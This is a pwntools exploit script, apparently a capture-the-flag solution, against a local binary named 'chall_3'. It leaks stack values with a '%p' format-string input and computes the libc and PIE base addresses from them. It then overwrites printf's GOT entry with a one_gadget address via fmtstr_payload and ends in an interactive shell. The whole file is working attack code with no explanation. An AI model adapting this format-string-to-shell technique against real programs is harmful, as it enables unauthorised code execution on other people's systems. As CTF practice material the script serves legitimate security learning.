from pwn import *

context.arch = 'amd64'

io = process("./chall_3")

elf = ELF("./chall_3")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

io.sendlineafter("Choose an option: ", b"1")

io.sendline(b"AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p")

io.sendlineafter("Choose an option: ", b"2")

io.recvuntil("Mensaje recibido: \n")
#io.interactive()
leak = io.recvline().strip().split(b".")
#leak = [int(x, 16) for x in leak]
print(f"Leaked addresses: {[x for x in leak]}")

libc_leak = int(leak[3], 16)

pie_leak = int(leak[6], 16)

print(f"Leaked libc address: {hex(libc_leak)}")

libc.address = libc_leak - 0xf8300

print(f"Leaked libc address: {hex(libc.sym.system)}")

print(f"Pie address: {hex(pie_leak)}")

elf.address = pie_leak - 0x3dd8

one_gadget = [0x4c139, 0x4c140, 0xd515f] 

payload = fmtstr_payload(14, {elf.got.printf: p64(libc.address + one_gadget[0])}, write_size='short')

io.sendlineafter("Choose an option: ", b"1")
print(payload)

io.send(payload)

io.interactive()